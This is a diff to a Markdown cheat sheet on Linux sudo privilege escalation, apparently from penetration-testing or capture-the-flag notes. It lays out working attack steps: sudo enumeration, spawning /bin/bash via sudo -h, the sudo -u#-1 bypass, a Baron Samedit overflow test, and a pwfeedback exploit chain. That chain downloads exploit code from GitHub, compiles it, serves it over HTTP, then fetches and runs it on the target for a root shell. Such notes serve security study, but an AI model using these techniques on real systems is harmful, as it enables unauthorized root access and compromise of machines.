@@ -50,37 +50,100 @@ render_with_liquid: false
     echo $2
     ```
 
-3. **User's Privileges and Commands**
+3. **Sudo Bypass**
 
-    ```sh
-    sudo -l
-    sudo -ll
+    1. **Check Properties**
 
-    # Specify hostname
-    sudo -h <host-name> -l
-    # Execute via the hostname
-    sudo -h <host-name> /bin/bash
-    ```
+        ```sh
+        sudo -l
+        sudo -ll
 
-    1. **Sudo Version <= 1.28**
+        # Specify hostname
+        sudo -h <host-name> -l
+        # Execute via the hostname
+        sudo -h <host-name> /bin/bash
+        ```
+
+    2. **No Reasons Why You Don't**
+
+        If you can execute 'su' command as root privilege, you can switch to root.
+
+        ```sh
+        sudo su root
+
+        # Other user
+        sudo -u john whoami
+        ```
+
+    3. **Sudo Version <= 1.28**
 
         ```sh
         sudo -u#-1 /bin/bash
         ```
 
-    2. **Other PrivEsc**
+    4. **Sudo Buffer Overflow**
 
-        If you can execute 'su' command as root privilege, switch to root.
+        1. **Baron Samedit (Heap Buffer Overflow)**
 
-        ```sh
-        sudo su root
-        ```
+            1. **Check Vulnerability to Overwrite Heap Buffer in Target Machine**
 
-        Run as other users
+                ```sh
+                sudoedit -s '\' $(python3 -c 'print("A"*1000)')
+                ```
 
-        ```sh
-        sudo -u john whoami
-        ```
+            2. **PoC**
+
+                See **[this repository](https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156){:target="_blank"}**.
+
+        2. **Pwfeedback**
+
+            1. **Check Enabling the Pwfeedback in /etc/sudoers**
+
+                If so, when running sudo command and inputting password, asterisk will be displayed.  
+                You can make it the buffer overflow.
+
+                ```sh
+                cat /etc/sudoers
+
+                # -------------------------------------------
+
+                ...
+                Defaults pwfeadback
+                ...
+                ```
+
+            2. **Input Long String to Password**
+
+                ```sh
+                perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
+                # [sudo] password for tryhackme: Segmentation fault
+                ```
+
+            3. **Download a Payload and Compile in Local Machine**
+
+                ```sh
+                wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
+                gcc -o exploit exploit.c
+                ```
+
+            4. **Transfer the Payload to Remote Machine**
+
+                ```sh
+                # In local machine
+                python3 -m http.server 8000
+
+                # In remote machine
+                wget http://<local-ip>:8000/exploit
+                ```
+
+            5. **Execute the Payload in Remote Machine**
+
+                After that, you'll get a root shell.
+
+                ```sh
+                chmod 700 ./exploit
+                ./exploit
+                ```
 
 4. **Interest Information**
 
